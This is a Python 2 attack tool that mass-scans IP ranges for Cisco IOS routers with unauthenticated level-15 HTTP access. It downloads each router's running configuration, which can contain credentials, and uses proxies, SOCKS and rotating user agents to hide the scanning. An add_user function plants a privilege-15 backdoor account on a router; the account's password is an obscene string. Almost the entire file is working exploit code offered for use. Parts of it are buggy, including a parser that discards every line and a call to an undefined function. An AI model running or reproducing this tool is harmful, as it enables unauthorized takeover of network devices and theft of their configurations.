import os
import re
import sys
import time
import socks
import socket
import urllib
import httplib
import urllib2
import threading
from netaddr import *
from random import choice

version = '1.0'

if sys.platform == 'linux-i386' or sys.platform == 'linux2' or sys.platform == 'darwin':
	command = 'clear'
elif sys.platform == 'win32':
	command = 'cls'
else:
	command = 'Unknown'

######################################################################################################################################
'''
Classes for socksipy handler
'''

class SocksiPyConnection(httplib.HTTPConnection):
	def __init__(self, proxytype, proxyaddr, proxyport = None, rdns = True, username = None, password = None, *args, **kwargs):
		self.proxyargs = (proxytype, proxyaddr, proxyport, rdns, username, password)
		httplib.HTTPConnection.__init__(self, *args, **kwargs)

	def connect(self):
		self.sock = socks.socksocket()
		self.sock.setproxy(*self.proxyargs)
		if isinstance(self.timeout, float):
			self.sock.settimeout(self.timeout)
		self.sock.connect((self.host, self.port))

class SocksiPyHandler(urllib2.HTTPHandler):
	def __init__(self, *args, **kwargs):
		self.args = args
		self.kw = kwargs
		urllib2.HTTPHandler.__init__(self)

	def http_open(self, req):
		def build(host, port=None, strict=None, timeout=0):
			conn = SocksiPyConnection(*self.args, host=host, port=port, strict=strict, timeout=timeout, **self.kw)
			return conn
		return self.do_open(build, req)

######################################################################################################################################

def RandomAgent():
	user_agent = ['Mozilla/5.0 (Windows NT 6.2; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0',
				  'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
				  'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.43 Safari/534.24',
				  'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.25 (KHTML, like Gecko) Chrome/12.0.706.0 Safari/534.25',
				  'Mozilla/5.0 (Windows NT 5.1; U; ; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.52',
				  'Mozilla/5.0 (Windows NT 5.1; U; Firefox/3.5; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.53',
				  'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24',
				  'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30',
				  'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)',
				  'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)',
				  'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_1 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8B117 Safari/6531.22.7',
				  'Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10',
				  'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; es-es) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10',
				  'Mozilla/5.0 (X11; U; NetBSD i386; en-US; rv:1.9.2.12) Gecko/20101030 Firefox/3.6.12',
				  'Mozilla/5.0 (X11; U; OpenBSD amd64; en-US; rv:1.9.0.1) Gecko/2008081402 Firefox/3.0.1',
				  'Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3]',
				  'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.8) Gecko/20100318 Gentoo Firefox/3.5.8',
				  'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.8pre) Gecko/20091227 Ubuntu/9.10 (karmic) Firefox/3.5.5',
				  'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Ubuntu/10.10 Chromium/8.0.552.237 Chrome/8.0.552.237 Safari/534.10',
				  'Mozilla/6.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:2.0.0.0) Gecko/20061028 Firefox/3.0',
				  'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.134 Safari/534.16',
				  'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-US) AppleWebKit/534.18 (KHTML, like Gecko) Chrome/11.0.660.0 Safari/534.18',
				  'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20',
				  'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7; en-us) AppleWebKit/533.4 (KHTML, like Gecko) Version/4.1 Safari/533.4',
				  'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7_0; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.7 Safari/533.2',
				  'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7_0; en-US) AppleWebKit/534.21 (KHTML, like Gecko) Chrome/11.0.678.0 Safari/534.21',
				  'Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0',
				  'Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16',
				  'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4',
				  'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.9.0.10) Gecko/20090624 Firefox/3.5',
				  'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.9.1) Gecko/20090703 Firefox/3.5',
				  'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.9.2.9) Gecko/20100913 Firefox/3.6.9',
				  'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.9a2) Gecko/20080530 Firefox/3.0a2']
	random_user_agent = choice(user_agent)
	return random_user_agent

def Banner():
		print 

def ios_http_vuln(ip):
	try:
		ip = "http://"+ip

		if options.proxy:
			proxy_support = urllib2.ProxyHandler({"http":options.proxy})
			opener = urllib2.build_opener(proxy_support)
			urllib2.install_opener(opener)
			req = urllib2.Request(ip)
			req.add_header('User-Agent',user_agent)
			res = urllib2.urlopen(req)
			if res.info().getheaders('Server')[0] == 'cisco-IOS':
				time.sleep(time_to_sleep)
				print "\n[+] IP:",ip[7:].strip(),"Running Cisco-IOS"
				ip = ip+"/level/15/exec/-"
				req = urllib2.Request(ip)
				req.add_header('User-Agent',user_agent)
				res = urllib2.urlopen(req)
				if res.code == 200:
					print "[+] Get running configuration from ", ip[7:-16].strip()
					ip = ip+"/show/running-config/CR"
					req = urllib2.Request(ip)
					req.add_header('User-Agent',user_agent)
					res = urllib2.urlopen(req)
					config_file = open(cisco_config_dir+ip[7:-39].strip()+'-run.config','w')
					config_file.write(res.read())
					config_file.close

				else:
					print "[-] Unable to exploit"
			else:
				pass
		############################################################################################################

		elif options.socks:
			if options.socks[:6] == "socks5":
				p = '(?:socks5.*://)?(?P<host>[^:/ ]+).?(?P<port>[0-9]*).*'
				parse = re.search(p,options.socks)
				socks_host = parse.group('host')
				socks_port = int(parse.group('port'))

				opener = urllib2.build_opener(SocksiPyHandler(socks.PROXY_TYPE_SOCKS5, socks_host, socks_port))
				urllib2.install_opener(opener)
				req = urllib2.Request(ip)
				req.add_header('User-Agent',user_agent)
				res = urllib2.urlopen(req)
				if res.info().getheaders('Server')[0] == 'cisco-IOS':
					time.sleep(time_to_sleep)
					print "\n[+] IP:",ip[7:].strip(),"Running Cisco-IOS"
					ip = ip+"/level/15/exec/-"
					req = urllib2.Request(ip)
					req.add_header('User-Agent',user_agent)
					res = urllib2.urlopen(req)
					if res.code == 200:
						print "[+] Get running configuration from ", ip[7:-16].strip()
						ip = ip+"/show/running-config/CR"
						req = urllib2.Request(ip)
						req.add_header('User-Agent',user_agent)
						res = urllib2.urlopen(req)
						config_file = open(cisco_config_dir+ip[7:-39].strip()+'-run.config','w')
						config_file.write(res.read())
						config_file.close

					else:
						print "[-] Unable to exploit"
				else:
					pass
			if options.socks[:6] == "socks4":
				p = '(?:socks4.*://)?(?P<host>[^:/ ]+).?(?P<port>[0-9]*).*'
				parse = re.search(p,options.socks)
				socks_host = parse.group('host')
				socks_port = int(parse.group('port'))

				opener = urllib2.build_opener(SocksiPyHandler(socks.PROXY_TYPE_SOCKS4, socks_host, socks_port))
				urllib2.install_opener(opener)
				req = urllib2.Request(ip)
				req.add_header('User-Agent',user_agent)
				res = urllib2.urlopen(req)
				if res.info().getheaders('Server')[0] == 'cisco-IOS':
					time.sleep(time_to_sleep)
					print "\n[+] IP:",ip[7:].strip(),"Running Cisco-IOS"
					ip = ip+"/level/15/exec/-"
					req = urllib2.Request(ip)
					req.add_header('User-Agent',user_agent)
					res = urllib2.urlopen(req)
					if res.code == 200:
						print "[+] Get running configuration from ", ip[7:-16].strip()
						ip = ip+"/show/running-config/CR"
						req = urllib2.Request(ip)
						req.add_header('User-Agent',user_agent)
						res = urllib2.urlopen(req)
						config_file = open(cisco_config_dir+ip[7:-39].strip()+'-run.config','w')
						config_file.write(res.read())
						config_file.close

					else:
						print "[-] Unable to exploit"
				else:
					pass

		############################################################################################################
		else:
			req = urllib2.Request(ip)
			req.add_header('User-Agent',user_agent)
			res = urllib2.urlopen(req)
			if res.info().getheaders('Server')[0] == 'cisco-IOS':
				print "\n[+] IP:",ip[7:].strip(),"Running Cisco-IOS"
				ip = ip+"/level/15/exec/-"
				req = urllib2.Request(ip)
				req.add_header('User-Agent',user_agent)
				res = urllib2.urlopen(req)
				if res.code == 200:
					print "[+] Get running configuration from ", ip[7:-16].strip()
					ip = ip+"/show/running-config/CR"
					req = urllib2.Request(ip)
					req.add_header('User-Agent',user_agent)
					res = urllib2.urlopen(req)
					config_file = open(cisco_config_dir+ip[7:-39].strip()+'-run.config','w')
					config_file.write(res.read())
					config_file.close

				else:
					print "[-] Unable to exploit"
			else:
				pass

		dirlist = os.listdir(cisco_config_dir)
		for file in dirlist:
			cisco_config_parser(file)
	except Exception as e:
		pass



def cisco_config_parser(files):
	'''Remove junk data(HTML tag) from running configuration cisco vuln device file
	'''
	lines = open(cisco_config_dir+files).read().split('\n')
	newlines = []
	for line in lines:
		line = line.strip()
		line = clean_html(line)
	f = open(cisco_config_dir+files,'w')
	f.write('\n'.join(newlines))
	f.close

def add_user(ip):
	'''Add user to Cisco Device via IOS HTTP Vulnerabiltiy'''
	try:
		print "[+] Add user 'ciscoadm' with password 'teenslutfuckingciscorouter'"
		print '[+] Send command',"username rtadmin privilege 15 secret hax0r",'to',ip
		command = "username ciscoadm privilege 15 secret teenslutfuckingciscorouter"
		headers = {"Content-Type" : "application/x-www-form-urlencoded", "Content-Length" : 133}
		params = urllib.urlencode({"command" : command, "command_url" : "/level/15/exec/-","new_command_url" : "/level/15/configure/-"})
		h = httplib.HTTPConnection(ip)
		h.request("POST", "/level/15/exec/-/configure/http", params, headers)
		print "[+] Added user successfully!" 
	except:
		print "[-] Unable to add user"

if __name__ == "__main__":
	import argparse
	os.system(command)
	try:
		parser = argparse.ArgumentParser()
		parser.add_argument('-t', '--target', action='store', dest='target',
							help="""Target IP Address (Support both Single IP Address and 
							Variable Length Subnet Masking (VLSM CIDR) Ex. 192.168.0.1, 192.168.0.58/27)""")
		parser.add_argument('-p', "--proxy", action='store', dest='proxy',
							help='Use a HTTP proxy to connect to the target (ex. http://127.0.0.1:8080)')
		############################################################################################################
		parser.add_argument('-s', "--socks", action='store', dest='socks',
							help='Use a SOCKS4/5 proxy to connect to the target (ex. socks://127.0.0.1:9050)')
		############################################################################################################
		parser.add_argument('--version', action='version', version='%(prog)s 1.0')

		if len(sys.argv)==1:
			Banner()
			parser.print_help()
			sys.exit(1)
		options = parser.parse_args()

		#Banner()
		current_dir = os.getcwd()
		
		if not os.path.exists(current_dir+'/config'):
			try:
				os.mkdir('config')
			except Exception as e: 
				pass

		cisco_config_dir = current_dir+'/config/'


		user_agent = RandomAgent()

		if options.target[-3:-2] != '/':
			ip = options.target
			print "[+] Scanning Single IP:",ip
			print "[+] Random User-Agent..."
			print "[+] Selected User-Agent: ",user_agent
			ios_http_vuln(ip)
		else:
			print "\n[+] Scanning Network: ", options.target
			total_ip = IPNetwork(options.target)
			times = len(total_ip)-2
			time_to_sleep = times*0.4
			print "[+] Scaning totals:",len(total_ip)-2,"ips"
			print "[+] Scanning for Cisco Vulnerability"
			print "[+] Random User-Agent..."
			print "[+] Selected User-Agent: ",user_agent

			sys.stdout.write('[+] Scanning IP: ')
			last_lenght = 0
			for ip in IPNetwork(options.target).iter_hosts():
				ip = str(ip).strip()
				sys.stdout.write('\b' * last_lenght)    # go back
				sys.stdout.write(' ' * last_lenght)     # 
				sys.stdout.write('\b' * last_lenght)    # reposition
				sys.stdout.write(ip)
				sys.stdout.flush()
				last_lenght = len(ip)
				time.sleep(0.5)
				threading.Thread(target=ios_http_vuln, args=(ip,)).start()
	except Exception as e:
		pass